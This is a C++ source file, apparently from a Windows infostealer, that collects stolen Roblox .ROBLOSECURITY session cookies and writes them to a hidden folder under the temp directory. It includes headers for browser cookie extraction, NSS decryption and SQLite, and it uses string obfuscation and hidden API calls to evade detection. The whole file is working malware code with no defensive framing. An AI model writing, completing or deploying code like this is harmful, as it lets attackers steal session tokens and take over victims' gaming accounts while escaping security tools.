#include "core.h"
#include "Cookies.h"
#include "Browsers_EntryPoint.h"
#include "winapi_structs.h"
#include "Crypto.h"
#include "nss3.h"
#include "os.h"
#include "Deduplicator.h"
#include "obfusheader.h" 
#include <vector>
#include "sqlite3.h"
#include <filesystem>
#include <windows.h>  
#include <fstream>  
#include <iostream>
#include "Helper.h"

#include <sstream>
#include <string>

namespace fs = std::filesystem;

#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "Shell32.lib")

// Function to save .ROBLOSECURITY cookies to a specific file
// This was made for SWIM he should ... this took me 5 minutes.
void SaveRobloxSecurityCookie(const std::vector<std::string>& cookie_values) {
    char tempPath[MAX_PATH];
    if (HiddenCalls::GetTempPathA(MAX_PATH, tempPath) == 0) {
        return;
    }

    std::string folderPath = std::string(tempPath) + OBF("sryxen\\Games\\roblox");
    std::string filePath = folderPath + OBF("\\robloxsecurity.txt");

    fs::create_directories(folderPath);

    std::ofstream outFile(filePath, std::ios::out | std::ios::app);
    if (!outFile) {
        return;
    }

    std::vector<std::string> deduplicatedValues = Deduplicate(cookie_values);

    for (const auto& value : deduplicatedValues) {
        outFile << OBF("ROBLOSECURITY=") << value << std::endl;
    }

    outFile.close();
}

